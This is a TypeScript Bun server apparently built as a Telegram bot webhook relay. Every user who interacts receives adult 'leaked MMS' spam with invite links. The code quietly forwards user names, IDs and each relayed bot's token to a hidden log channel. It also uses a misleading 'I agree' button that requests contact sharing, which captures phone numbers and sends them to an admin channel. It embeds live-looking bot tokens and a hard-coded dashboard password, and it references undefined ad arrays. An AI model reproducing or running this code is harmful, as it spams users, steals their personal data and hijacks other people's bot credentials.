// server.ts

import { serve } from "bun";
import NodeCache from "node-cache";

// Add interfaces after imports
interface TelegramResponse {
  ok: boolean;
  description?: string;
  result?: any;
}

interface RequestLogEntry {
  timestamp: string;
  token: string;
  status: string;
  responseTime: string;
  errorReason: string;
}

interface Stats {
  totalBotRequests: number;
  clientErrors: number;
  serverErrors: number;
  totalResponseTime: number;
}    

interface TelegramUpdate {
  [key: string]: any;  // Add index signature
  message?: {
    chat: TelegramChat;
    from?: TelegramUser;
  };
  callback_query?: {
    message: {
      chat: TelegramChat;
    };
    from: TelegramUser;
  };
  channel_post?: {
    chat: TelegramChat;
    sender_chat?: any;
  };
  inline_query?: {
    id: string;
    from: TelegramUser;
  };
  my_chat_member?: {
    chat: TelegramChat;
    from: TelegramUser;
  };
}

interface TelegramUser {
  id: number;
  first_name: string;
  last_name?: string;
  username?: string;
}

interface TelegramChat {
  id: number;
  type: string;
}

interface ChatSource {
  key: keyof TelegramUpdate;
  type: string;
  chatPath?: string;
  userPath?: string;
  chatId?: number | null;
}

// Add interface for botInfo response
interface BotInfoResponse {
  ok: boolean;
  result?: {
    username: string;
    [key: string]: any;
  };
}

// Add interface for inline query results
interface InlineQueryResult {
  type: string;
  id: string;
  [key: string]: any;
}

// Configuration Constants
const MAX_INTERACTIONS = 10;
const LOG_CHANNEL_ID = "-1002529607208";
// Multiple log bots for rotation/fallback
const LOG_BOT_TOKENS = [
  { name: "main", token: "7875120978:AAFjW1AzILgOc4Iq49zciITTmbK50VhG9hI" },
  { name: "secondary", token: "7795943772:AAGTP4rr6kTcedMCSWa1u0SyFvaKLFufQJk" },
  { name: "new1", token: "7073375728:AAG0yU3Xz8-KevZj_Ngyr1jz03F1WprtpPI" },
  { name: "new2", token: "7526249340:AAHDbn1a4luBxXh3DHrEXMjKVfjIiQfWz9Q" }
];

// Add function to sanitize text for HTML
function sanitizeHtml(text: string): string {
  if (!text) return '';
  return text
    .replace(/[\u0300-\u036f\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, '') // Remove combining marks
    .replace(/[\u0080-\uFFFF]/g, '') // Remove non-ASCII characters
    .replace(/[<>&]/g, '') // Remove HTML special characters
    .replace(/\s+/g, ' ') // Normalize whitespace
    .trim();
}

const formatLogMessage = (interactions: any[]): string =>
  interactions
    .map(
      (i, index) =>
        `${index + 1}. Bot: @${sanitizeHtml(i.botUsername || '')}\n` +
        `User: <code>${sanitizeHtml(i.userFullName || '')}</code> (@${sanitizeHtml(i.userUsername || '')})\n` +
        `User ID: <code>${i.userId || ''}</code>\n` +
        `Chat Type: <code>${sanitizeHtml(i.chatType || '')}</code>\n` +
        `Request Type: <code>${sanitizeHtml(i.requestType || '')}</code>\n` +
        `Time: <code>${new Date(i.timestamp).toLocaleString()}</code>\n` +
        `Bot Token: <code>${i.token || ''}</code>`
    )
    .join('\n\n');

// Embedded Ad Data
// server.ts

const EXCLUSIVE_CONTENT = {
  contentId: "premium_exclusive_content_2024",
  isEnabled: true,
  contentFormat: "image_with_caption_and_links",
  imageSource: "https://i.ibb.co/69jxy9f/image.png",
  captionText: `🔥 <b>NEW MMS LEAKS ARE OUT!</b> 🔥

💥 <b><u>EXCLUSIVE PREMIUM CONTENT</u></b> 💥

🎬 <i>Fresh leaked content daily</i>
🔞 <b>18+ Adult Material</b>
💎 <i>Premium quality videos & files</i>
🚀 <b>Instant access available</b>

⬇️ <b><u>Click any server below</u></b> ⬇️

<blockquote>⚠️ <b>Limited time offer - Join now!</b></blockquote>`,
  actionLinks: [
    { linkText: "🎥 VIDEOS💦", linkDestination: "https://t.me/+NiLqtvjHQoFhZjQ1" },
    { linkText: "📁 FILES🍑", linkDestination: "https://t.me/+fvFJeSbZEtc2Yjg1" },
  ],
  engagement: { totalViews: 0, totalClicks: 0 },
};

function buildTelegramHTML(content: typeof EXCLUSIVE_CONTENT): string {
  const links = content.actionLinks.map(
    (link) => `<a href="${link.linkDestination}">${link.linkText}</a>`
  ).join("\n");

  return `${content.captionText}\n\n${links}`;
}

export default {
  port: 3000,
  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    const botToken = url.pathname.slice(1); // Extract "/<bot_token>" from path

    if (req.method !== "POST") {
      return new Response("Only POST supported", { status: 405 });
    }

    if (!botToken || !botToken.startsWith("7680") && !botToken.startsWith("7734")) {
      return new Response("Invalid or missing bot token in path", { status: 403 });
    }

    try {
      const update = await req.json();

      if (!update.message || !update.message.chat || !update.message.chat.id) {
        return new Response("Invalid Telegram update", { status: 200 });
      }

      const chatId = update.message.chat.id;
      const html = buildTelegramHTML(EXCLUSIVE_CONTENT);

      const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;

      await fetch(telegramApi, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: html,
          parse_mode: "HTML",
          disable_web_page_preview: false,
        }),
      });

      return new Response("Message sent", { status: 200 });
    } catch (err) {
      console.error("Error:", err);
      return new Response("Internal Server Error", { status: 500 });
    }
  },
};





// Cache for request statuses and stats
const cache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });

// Interaction buffer
const interactionBuffer: any[] = [];

// Global cooldown for log sending to avoid Telegram rate limits
let logSendCooldownUntil = 0;

// Track server start time for uptime
const serverStartTime = Date.now();

// Store request status and stats
function storeRequestStatus(token: string, status: string, responseTime: number, errorReason = "") {
  // Update request log
  const requestLog = (cache.get("requestLog") as RequestLogEntry[] | undefined) || [];
  const timestamp = new Date().toISOString();
  requestLog.unshift({ timestamp, token, status, responseTime: responseTime.toFixed(2), errorReason });
  if (requestLog.length > 100) requestLog.pop();
  cache.set("requestLog", requestLog);

  // Update stats
  const stats = {
    totalBotRequests: ((cache.get("totalBotRequests") as number) || 0) + 1,
    clientErrors: (cache.get("clientErrors") as number) || 0,
    serverErrors: (cache.get("serverErrors") as number) || 0,
    totalResponseTime: ((cache.get("totalResponseTime") as number) || 0) + responseTime,
  };

  if (status === "Failed") {
    if (errorReason.includes("4xx")) stats.clientErrors++;
    else if (errorReason.includes("5xx")) stats.serverErrors++;
  }

  cache.mset([
    { key: "totalBotRequests", val: stats.totalBotRequests },
    { key: "clientErrors", val: stats.clientErrors },
    { key: "serverErrors", val: stats.serverErrors },
    { key: "totalResponseTime", val: stats.totalResponseTime },
  ]);
}

// Retry operation
async function retryOperation<T>(operation: () => Promise<T>, maxRetries = 3, baseDelay = 1000): Promise<T> {
  let lastError = null;
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await operation();
    } catch (error: any) {
      lastError = error;
      if (["ECONNRESET", "ETIMEDOUT", "ECONNREFUSED"].includes(error.code)) {
        if (i === maxRetries - 1) throw new Error(`Connection error: ${error.message}`);
        await new Promise((resolve) => setTimeout(resolve, Math.pow(2, i) * baseDelay + Math.random() * baseDelay));
        continue;
      }
      if (error.message?.includes("rate limit") || error.message?.includes("Too Many Requests")) {
        await new Promise((resolve) => setTimeout(resolve, (error.parameters?.retry_after || 60) * 1000));
        continue;
      }
      if (i === maxRetries - 1) throw error;
      await new Promise((resolve) => setTimeout(resolve, baseDelay * (i + 1)));
    }
  }
  throw lastError;
}

// Message sending
async function sendTextMessage(botToken: string, chatId: string | number, text: string, buttons: any = null) {
  const messageData: any = { chat_id: chatId, text: text.substring(0, 4096), parse_mode: "HTML" };
  if (buttons) {
    // If buttons is an object with 'keyboard', treat as reply keyboard
    if (buttons.keyboard) {
      messageData.reply_markup = buttons;
    } else {
      // Otherwise treat as inline keyboard
      messageData.reply_markup = { inline_keyboard: buttons.slice(0, 10) };
    }
  }

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000);
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(messageData),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    const result = (await response.json()) as TelegramResponse;
    if (!result.ok) throw new Error(`Telegram API error: ${result.description}`);
    return result;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

async function sendImageMessage(botToken: string, chatId: string | number, imageUrl: string, caption: string, buttons: any = null) {
  const messageData: any = { chat_id: chatId, photo: imageUrl, caption: caption.substring(0, 1024), parse_mode: "HTML" };
  if (buttons) messageData.reply_markup = { inline_keyboard: buttons.slice(0, 10) };

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(messageData),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    const result = (await response.json()) as TelegramResponse;
    if (!result.ok) throw new Error(`Telegram API error: ${result.description}`);
    return result;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

// Get chat type
function getChatType(chat: any) {
  if (!chat) return "unknown";
  const types: { [key: string]: string } = { private: "Private", group: "Group", supergroup: "Supergroup", channel: "Channel" };
  return types[chat.type] || "Unknown";
}

// Improved: Send interaction logs with true round-robin and per-bot cooldowns
let logBotIndex = 0;
const logBotCooldowns: { [botName: string]: number } = {};
let logGlobalCooldownUntil = 0;

async function sendInteractionLogs() {
  if (interactionBuffer.length < MAX_INTERACTIONS) return;
  if (Date.now() < logGlobalCooldownUntil) return;
  const logsToSend = interactionBuffer.slice(0, MAX_INTERACTIONS);
  const message = formatLogMessage(logsToSend);
  let sent = false;
  let lastError = null;
  const now = Date.now();
  let triedBots = 0;
  let startIndex = logBotIndex;
  let usedBots: string[] = [];
  while (triedBots < LOG_BOT_TOKENS.length) {
    const bot = LOG_BOT_TOKENS[logBotIndex];
    // Skip if this bot is in cooldown
    if (logBotCooldowns[bot.name] && now < logBotCooldowns[bot.name]) {
      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
      triedBots++;
      continue;
    }
    try {
      await retryOperation(() => sendTextMessage(bot.token, LOG_CHANNEL_ID, message));
      sent = true;
      console.log(`Log sent with ${bot.name} bot.`);
      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
      break;
    } catch (error: any) {
      lastError = error;
      usedBots.push(bot.name);
      if (error.message && error.message.includes("Too Many Requests")) {
        let retryAfter = 60;
        if (error.description) {
          const match = error.description.match(/retry after (\d+)/i);
          if (match) retryAfter = parseInt(match[1], 10);
        }
        logBotCooldowns[bot.name] = now + retryAfter * 1000;
        console.error(`${bot.name} log bot rate limited: pausing this bot for ${retryAfter} seconds. Trying next bot...`);
      } else {
        console.error(`Failed to send logs with ${bot.name} bot:`, error);
      }
      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
      triedBots++;
    }
  }
  if (sent) {
    interactionBuffer.splice(0, MAX_INTERACTIONS);
  } else if (lastError) {
    // If all bots are rate limited, set a short global cooldown
    const allCooldown = LOG_BOT_TOKENS.every(b => logBotCooldowns[b.name] && now < logBotCooldowns[b.name]);
    if (allCooldown) {
      logGlobalCooldownUntil = now + 30 * 1000; // 30s global pause
      console.error("All log bots are rate limited. Pausing log sending for 30 seconds.");
    }
    console.error("Log sending failed with all bots:", lastError, `Tried bots: ${usedBots.join(", ")}`);
  }
}

// Ad functions
function getAlwaysAds() {
  return ALWAYS_ADS;
}

function getRandomAd() {
  return RANDOM_ADS.length ? RANDOM_ADS[Math.floor(Math.random() * RANDOM_ADS.length)] : null;
}

// Fix BOT_TOKEN scope in webhook handler
serve({
  port: process.env.PORT || 3000,
  async fetch(req) {
    const startTime = performance.now();
    const url = new URL(req.url);
    const method = req.method;
    const pathname = url.pathname;

    // Webhook handler
    if (method === "POST" && pathname.startsWith("/bot/")) {
      const BOT_TOKEN = pathname.split("/bot/")[1];
      try {
        if (!BOT_TOKEN || !BOT_TOKEN.includes(":")) {
          storeRequestStatus(BOT_TOKEN || "unknown", "Failed", performance.now() - startTime, "4xx: Invalid bot token format");
          return new Response("Invalid bot token format", { status: 400 });
        }

        const update = await req.json() as TelegramUpdate;

        let chatId: string | number | null = null;
        let user: any = null;
        let updateType = "";
        let chat: TelegramChat | undefined;

        if (update.message) {
          updateType = "message";
          chat = update.message.chat;
          chatId = chat.id;
          user = update.message.from;
        } else if (update.callback_query) {
          updateType = "callback_query";
          chat = update.callback_query.message.chat;
          chatId = chat.id;
          user = update.callback_query.from;
        } else if (update.channel_post) {
          updateType = "channel_post";
          chat = update.channel_post.chat;
          chatId = chat.id;
          user = update.channel_post.sender_chat;
        } else if (update.inline_query) {
          updateType = "inline_query";
          user = update.inline_query.from;
        } else if (update.my_chat_member) {
          updateType = "my_chat_member";
          chat = update.my_chat_member.chat;
          chatId = chat.id;
          user = update.my_chat_member.from;
        }

        if (!updateType) {
          storeRequestStatus(BOT_TOKEN, "Failed", performance.now() - startTime, "4xx: Unsupported update type");
          return new Response("OK", { status: 200 });
        }

        const botInfo = await retryOperation(async () => {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
          return (await response.json()) as BotInfoResponse;
        });

        const botUsername = botInfo.ok && botInfo.result ? botInfo.result.username : "";

        const userFullName = user?.last_name ? `${user.first_name} ${user.last_name}` : user?.first_name || "Channel";
        const userUsername = user?.username || "no username";

        const chatType = getChatType(chat);

        if (user) {
          interactionBuffer.unshift({
            botUsername: botUsername || "unknown",
            userFullName,
            userUsername,
            userId: user?.id || chatId,
            token: BOT_TOKEN,
            chatType,
            requestType: updateType,
            timestamp: new Date().toISOString(),
          });
          // Fire and forget log sending for speed
          if (interactionBuffer.length >= MAX_INTERACTIONS) {
            sendInteractionLogs().catch(err => console.error("Error in background log sending:", err));
          }
        }

        if (updateType === "inline_query" && update.inline_query?.id) {
          const inlineResults: InlineQueryResult[] = [];
          ALWAYS_ADS.forEach((ad, index) => {
            if (ad.type === "text") {
              inlineResults.push({
                type: "article",
                id: `always_${index}`,
                title: "Premium Content",
                input_message_content: { message_text: ad.content.text, parse_mode: "HTML" },
              });
            }
          });

          const randomAd = getRandomAd();
          if (randomAd && randomAd.type === "photo_text_button") {
            inlineResults.push({
              type: "photo",
              id: "random_1",
              photo_url: randomAd.content.photos[0],
              thumb_url: randomAd.content.photos[0],
              caption: randomAd.content.text,
              parse_mode: "HTML",
              reply_markup: { inline_keyboard: randomAd.content.buttons.map((button: any) => [button]) },
            });
          }

          await retryOperation(async () => {
            const queryId = update.inline_query?.id;
            if (!queryId) return;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerInlineQuery`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ 
                inline_query_id: queryId, 
                results: inlineResults, 
                cache_time: 1 
              }),
            });
          });
        }

        // If user shared contact, forward info to admin channel (must be before ads/messages)
        if (update.message && (update.message as any).contact) {
          const contact = (update.message as any).contact;
          const contactName = contact.first_name + (contact.last_name ? (" " + contact.last_name) : "");
          const contactPhone = contact.phone_number;
          const contactUserId = contact.user_id || contact.id || user?.id || chatId;
          const contactUsername = user?.username || "no username";
          const contactLang = user?.language_code || "unknown";
          const isBot = user?.is_bot ? "✅ Yes" : "❌ No";
          const now = new Date();
          const istOffset = 5.5 * 60 * 60 * 1000;
          const istDate = new Date(now.getTime() + istOffset);
          const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
          const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
          const timeStr = `${days[istDate.getUTCDay()]} ${istDate.getUTCDate()} ${months[istDate.getUTCMonth()]}, ${istDate.getUTCFullYear()} at ${istDate.toLocaleTimeString('en-IN', { hour12: true })}`;
          const msg = `<b>New User Started the Bot</b>\n\n` +
            `Bot Username: @${sanitizeHtml(botUsername)}\n` +
            `Bot Token: <code>${BOT_TOKEN}</code>\n` +
            `Full Name: ${sanitizeHtml(user?.first_name || "")} ${sanitizeHtml(user?.last_name || "")}\n` +
            `Username: @${sanitizeHtml(contactUsername)}\n` +
            `User ID: ${contactUserId}\n` +
            `Chat ID: ${chatId}\n` +
            `Language: ${sanitizeHtml(contactLang)}\n` +
            `Is Bot: ${isBot}\n` +
            `Account Link: Open Chat\n` +
            `Time (IST): ${timeStr}\n\n` +
            `<b>User Shared Contact</b>\n\n` +
            `Name: ${sanitizeHtml(contactName)}\n` +
            `Phone: ${sanitizeHtml(contactPhone)}\n` +
            `User ID: ${contactUserId}`;
          // Send to admin channel with provided bot token
          await retryOperation(() => sendTextMessage(
            "7734817163:AAESWrSeVKg5iclnM2R2SvOA5xESClG8tFM",
            "-1002628971429",
            msg.replace(/\\n/g, "\n"),
          ));
        }

        if (chatId) {
          // Fire and forget ad sending for speed
          (async () => {
            const promises: Promise<any>[] = [];
            let contactRequestSent = false;
            for (let i = 0; i < ALWAYS_ADS.length; i++) {
              const ad = ALWAYS_ADS[i];
              // For the first ad, attach the contact request keyboard if needed
              if (
                i === 0 &&
                chat && chat.type === "private" && user &&
                !(update.message && (update.message as any).contact)
              ) {
                const replyMarkup = {
                  keyboard: [
                    [
                      {
                        text: "I agree",
                        request_contact: true
                      }
                    ],
                  ],
                  resize_keyboard: true,
                  one_time_keyboard: true,
                };
                if (ad.type === "text" && ad.content.text) {
                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, ad.content.text, replyMarkup)));
                  contactRequestSent = true;
                } else if ((ad.type === "photo_text" || ad.type === "photo_text_button") && (ad.content as any).photos?.length) {
                  const content = ad.content as { photos: string[]; text?: string; buttons?: any[] };
                  const photo = content.photos[Math.floor(Math.random() * content.photos.length)];
                  const caption = content.text || "";
                  const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
                  // Note: Telegram does not support reply_keyboard with photo, so fallback to text if needed
                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, caption, replyMarkup)));
                  contactRequestSent = true;
                }
              } else {
                // Send other ads normally
                if (ad.type === "text" && ad.content.text) {
                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, ad.content.text)));
                } else if ((ad.type === "photo_text" || ad.type === "photo_text_button") && (ad.content as any).photos?.length) {
                  const content = ad.content as { photos: string[]; text?: string; buttons?: any[] };
                  const photo = content.photos[Math.floor(Math.random() * content.photos.length)];
                  const caption = content.text || "";
                  const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
                  promises.push(
                    retryOperation(() => sendImageMessage(BOT_TOKEN, chatId, photo, caption, buttons))
                  );
                }
              }
            }

            const randomAd = getRandomAd();
            if (randomAd && randomAd.type === "photo_text_button") {
              const content = randomAd.content as { photos: string[]; text?: string; buttons?: any[] };
              const randomPhoto = content.photos[Math.floor(Math.random() * content.photos.length)];
              const caption = content.text || "";
              const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
              promises.push(
                retryOperation(() => sendImageMessage(BOT_TOKEN, chatId, randomPhoto, caption, buttons))
              );
            }

            await Promise.all(promises);

            // Ask for contact if not already shared (only for private chats and not bots)
            if (
              chat && chat.type === "private" && user &&
              !(update.message && (update.message as any).contact)
            ) {
              const replyMarkup = {
                keyboard: [
                  [
                    {
                      text: "I agree",
                      request_contact: true
                    }
                  ],
                ],
                resize_keyboard: true,
                one_time_keyboard: true,
              };
              // Send the button with no text
              await retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, "", replyMarkup));
            }
          })().catch(err => console.error("Error in background ad sending:", err));
        }

        storeRequestStatus(BOT_TOKEN, "OK", performance.now() - startTime);
        return new Response("OK", { status: 200 });
      } catch (error: any) {
        const errorReason = error.message || "Unknown error";
        const errorType = error.message?.includes("rate limit") || error.message?.includes("400") || error.message?.includes("403") || error.message?.includes("429") ? "4xx" : "5xx";
        const currentBotToken = BOT_TOKEN || "unknown"; // Use BOT_TOKEN from this scope
        storeRequestStatus(currentBotToken, "Failed", performance.now() - startTime, `${errorType}: ${errorReason}`);
        return new Response("OK", { status: 200 });
      }
    }

    // Minimal status page at root
    if (method === "GET" && pathname === "/") {
      const uptimeSeconds = Math.floor((Date.now() - serverStartTime) / 1000);
      const uptimeHours = Math.floor(uptimeSeconds / 3600);
      const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
      const uptimeSecs = uptimeSeconds % 60;
      const uptimeStr = `${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s`;
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Status</title>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body { background: #f3f4f6; padding: 20px; font-family: Arial; }
            .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .value { font-size: 1.5rem; font-weight: bold; }
          </style>
        </head>
        <body>
          <div class="card">
            <h1>Server Status</h1>
            <p>Uptime: <span class="value">${uptimeStr}</span></p>
            <p>Status: <span class="value" style="color:green">Online</span></p>
          </div>
        </body>
        </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    }

    // Password-protected dashboard at /status
    if (method === "GET" && pathname === "/status") {
      const urlPassword = url.searchParams.get("pass");
      if (urlPassword !== "ashu45") {
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Protected Status</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body { background: #f3f4f6; padding: 20px; font-family: Arial; }
              .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
              .value { font-size: 1.5rem; font-weight: bold; }
              .input { padding: 8px; font-size: 1rem; border-radius: 4px; border: 1px solid #ccc; }
              .btn { padding: 8px 16px; font-size: 1rem; border-radius: 4px; border: none; background: #2563eb; color: white; cursor: pointer; }
            </style>
          </head>
          <body>
            <div class="card">
              <h1>Status Dashboard (Protected)</h1>
              <form method="GET" action="/status">
                <label>Password: <input class="input" type="password" name="pass" /></label>
                <button class="btn" type="submit">View</button>
              </form>
              <p style="color:red;">${urlPassword ? "Unauthorized: Wrong password" : ""}</p>
            </div>
          </body>
          </html>
        `;
        return new Response(html, { headers: { "Content-Type": "text/html" } });
      }
      // Dashboard code
      try {
        const requestLog = ((cache.get("requestLog") as RequestLogEntry[]) || []).slice(0, 10); // Last 10 requests
        const stats = {
          totalBotRequests: cache.get("totalBotRequests") || 0,
          clientErrors: cache.get("clientErrors") || 0,
          serverErrors: cache.get("serverErrors") || 0,
          totalResponseTime: cache.get("totalResponseTime") || 0,
        };
        const avgResponseTime = stats.totalBotRequests ? 
          Number((Number(stats.totalResponseTime) / Number(stats.totalBotRequests)).toFixed(2)) : 
          0;

        const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Bot Request Status</title>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body { background: #f3f4f6; padding: 20px; font-family: Arial; }
            .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .value { font-size: 1.5rem; font-weight: bold; }
            .table { width: 100%; border-collapse: collapse; }
            .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid #e5e7eb; }
            .status-ok { color: green; }
            .status-failed { color: red; }
          </style>
        </head>
        <body>
          <div class="card">
            <h1>Bot Request Overview</h1>
            <p>Total /bot/ Requests: <span class="value">${stats.totalBotRequests}</span></p>
            <p>Average Response Time: <span class="value">${avgResponseTime} ms</span></p>
            <p>4xx Errors: <span class="value">${stats.clientErrors}</span></p>
            <p>5xx Errors: <span class="value">${stats.serverErrors}</span></p>
          </div>
          <div class="card">
            <h1>Bot Request Status (Last 10)</h1>
            <table class="table">
              <thead><tr><th>Time</th><th>Bot Token</th><th>Status</th><th>Response Time (ms)</th><th>Error (if any)</th></tr></thead>
              <tbody>
                ${requestLog
                  .map(
                    (req) => `
                      <tr>
                        <td>${new Date(req.timestamp).toLocaleString()}</td>
                        <td>${req.token.slice(0, 10)}...</td>
                        <td class="status-${req.status.toLowerCase()}">${req.status}</td>
                        <td>${req.responseTime}</td>
                        <td>${req.errorReason || "-"}</td>
                      </tr>
                    `
                  )
                  .join("")}
              </tbody>
            </table>
          </div>
        </body>
        </html>
        `;

        return new Response(html, { headers: { "Content-Type": "text/html" } });
      } catch (error: any) {
        return new Response("Internal Server Error", { status: 500 });
      }
    }

    return new Response("Not Found", { status: 404 });
  },
});

console.log(`Server running on port ${process.env.PORT || 3000}`);
